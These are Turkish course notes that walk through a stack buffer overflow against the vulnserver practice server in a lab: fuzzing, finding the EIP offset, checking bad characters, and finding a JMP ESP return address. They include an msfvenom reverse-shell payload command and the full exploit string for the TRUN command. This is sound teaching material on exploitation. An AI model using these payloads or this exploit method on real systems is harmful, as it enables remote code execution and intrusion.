# Atıl Samancıoğlu Etik Hackerlik Python Kursunun Buffer Overflow kısmının notlarıdır! "vulnserver" kullanılmıştır.
# https://www.udemy.com/course/python-sifirdan-ileri-seviyeye/
# Buffer-Overflow-Notes
1 -  İlk önce kali üzerinde bulunan <b>generic_send_tcp</b> komutunu kullanarak ve bir spike dosyası oluşturarak, hizmetteki herhangi bir komutta buffer overflow olup olmadığını kontrol edecek  bir istek gönderiyoruz.

"generic_send_tcp" Kali'de buffer overflow fuzzing için kullanılır. Sunucular içindir ve bir <b>"spike"</b> dosyasına ihtiyaç duyar. 

Spike dosyası kod listesidir. Programın hangi komut veya instruction üzerine fuzzing deneyeceğini belirlemek için yazılır. Basit bir dildir.<br>
Örneğin:<br>
```
s_readline();
s_string("STATS ");
s_string_variable("A");
```
Örnek komut:
```
generic_send_tcp 10.0.2.15 9999 fuzz.spk 0 0
```
Sunucu çöktükten ve çöktüğüne emin olduktan sonra nerde çökertebildiğimizi bulabilmek için <b>Manual Fuzzing</b> yapmamız gerekmekte.
1. Adım için paylaştığım kodu düzenleyip çalıştırdıktan sonra sunucu çöktüğünde CTRL+C yapıyoruz. Ve bize "<b>tahminen</b>" nerede çöktüğünü gösteriyor. Değerleri kod içerisinde sürekli 100 ile arttırdığımız için kesin bir yer bulması mümkün değil. Bunun için bir sonraki adıma geçiyoruz.

NOT: TRUN'dan sonraki dize paket debugger'de izlenerek bulunmuştur.

NOT: TRUN bu sunucuya özeldir.

2 <b>-/usr/share/metasploit-framework/tools/exploit/pattern_create.rb</b> -> Fuzzing ile kaç karakterde çöktüğünü bulduktan sonra o değere yakın bir değerde pattern üretmek için.

Çöken değere yakın bir değer ile bir pattern üretiyoruz.  Eğer 2300de çöktüysek,
```
./pattern_create.rb -l 2500
```
Pattern'i 2. adımdaki kod ile gönderiyoruz.  Sunucu çöktükten sonra, Debugger üzerinde EIP'ye yazılan karakterlerin hex değerlerini not ediyoruz.

3 -```└─# ./pattern_offset.rb -l 2500 -q 386F4337```
"-l" değeri payload'ın uzunluğu, "-q" değeri EIP'ye yazılan değer.

Çıktıdan kaçıncı karakterde çöktüğünün bilgisini alıyoruz.

4 - Test: Paylaştığım kodda, çökerten karakter sayısı kadar "A", ve cidden yazılıp yazılmadığını denemek için 4 adet "B" gönderiyoruz. Hexadecimal üzerinde "42" olarak ifade edilen B değerinin Debugger'da EIP değerine yazıldığını görüyoruz.

5 - Test 2 - Bad Chars: Sunucunun okuyamadığı veya engellediği herhangi bir "bad character" olup olmadığını öğrenmek için, ekte paylaştığım kodu kullanıyoruz. Debugger üzerinden ESP'yi dump edip HEX sırasını takip ve kontrol ettiğimizde bir bozulma olmadığına emin olmamız gerekiyor. Bozulma olan karakterler "bad characters" olarak not edilir.

6- Exploit Plan: 
6.1.: EIP'de bizim enjekte etmeye çalıştığımız shellkoda nasıl yönlendirme yapabiliriz, kodumuzu nasıl yerleştirebiliriz, bunun için bir aratma yapmamız gerekiyor. Bir gerçek hayat senaryosunda birden çok seçenek denememiz gerekebilir. Genelde "JMP ESP" kullanılır. Atlama yapmaya yarar.

Kaynak: <a href="https://www.abatchy.com/2017/05/jumping-to-shellcode.html">shellcode jumping</a>

6.1.1: Metasploit içerisinde bulunan nasm_shell.rb ile kodumuzu assembly'e çevirmemiz gerekiyor.
```
└─# /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb 
nasm > JMP ESP
00000000  FFE4              jmp esp
nasm > 
```
"FFE4" değerini not ediyoruz.

6.1.2: Ben Immunity Debugger kullanmayı tercih ediyorum, Immunity için "Mona" adlı bir plugine ihtiyacımız olacak. Kurduktan ve sunucuyu çalıştırıp "Attach" ettikten sonra, bize kullanılan tüm modülleri ve bu modüllerin okuma/yazma'ya karşı korumalı olup olmadığını göstermesi için ```!mona modules``` komutunu Immunity üzerinden çalıştırıyoruz. 

Bu kısımda memory write koruması kapalı modüllerden birini seçiyoruz. Bu bizim senaryomuzda "essfunc.dll"

![image](https://user-images.githubusercontent.com/88983987/215236883-8aebe4f1-8e1b-459c-906e-982b449eeace.png)

Bu modül üzerinde yazma koruması yok. Bu modül üzerinde exploit çalıştırabiliriz. Modül içerisinde yazma yapabileceğimiz "JMP ESP" komutunu aratmamız gerekiyor. "nasm_shell" ile dönüştürdüğümüz kodu hex formatına dönüştürüp modül içerisinde aratıyoruz.
```
!mona find -s "\xff\xe4" -m essfunc.dll
```
"JMP ESP" işlemi çalıştırılan memory adress'leri not alıp tek tek deniyoruz. Bizim senaryomuzda çalışan memory adress: 0x625011AF

7. Exploit:

Exploit için öncelilkle bir reverse shell koduna ihtiyacımız var.
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.4 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"
```
```
"-p": Payload Türü
"LHOST": Geri Dönüş Sağlanacak Sunucu
"LPORT": Geri Dönüş Sağlanacak Sunucunun Portu
"EXITFUNC": Thread Process
"-f": C dilinde derlenmesi
"-a": Architecture
"-b": Bad Characters
```

Shell kodunu ürettikten sonra karşı tarafa yollamak kalıyor. Eklediğim exploit scripti bu işlemi yapıyor. Satırları açıklamam gerekirse:
```
stringToSend = "TRUN /.:/" + "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + payload
```

```
"TRUN /.:/" + "A" * 2003 # Çökertecek kadar kod yolla
"\xaf\x11\x50\x62" # JMP ESP -> Kodumu Çalıştır
"\x90" * 32 # NOP Code
"payload" -> MSFVenom ile ürettiğimiz payload
```
# GDB
```
● disassemble main - look at the assembly code of the main function
 ● break *0x12345678 - set a breakpoint at address 0x12345678
 ● x 0x12345678 - examine/print the content of address 0x12345678
 ● x/xw 0x12345678 - print the content of address 0x12345678 as hex word
 ● x/s 0x12345678 - print the content of address 0x12345678 as a string
 ● run - run/restart the program you are debugging
 ● continue - continue execution after you stopped at a breakpoint
 ● quit - exit gdb
 ```
 
# General
HEAP

STACK
Yerel değişkenler, fonksiyonlar içerisinde yapılan işlemler kaydedilir. Ram kaç GB olursa olsun, işletim sisteminin mimarisine göre belirli bir yer ayrılır. Stack bu limiti aşamaz. 

DATA
Global değişkenler ve statik değişkenler kaydedilir. Yaşam döngüsüne bağlı kalmayan değişkenlerdir.

TEXT
Assembly Instructions

int x; -> Local Değişken, Stack
int *y;
(int*)malloc(sizeof(int)); -> Heapte bir yer aç ve adres ata. Stack içerisinde sadece adresi tutulur. malloc yer ayırma fonksiyonudur. sizeof int'in boyutunu alır ve malloc ile int'in boyutu kadar bir yer ayırır.

Extended Stack Pointer
Buffer
Extended Base Pointer
Extended Instruction Pointer -> SCOPE
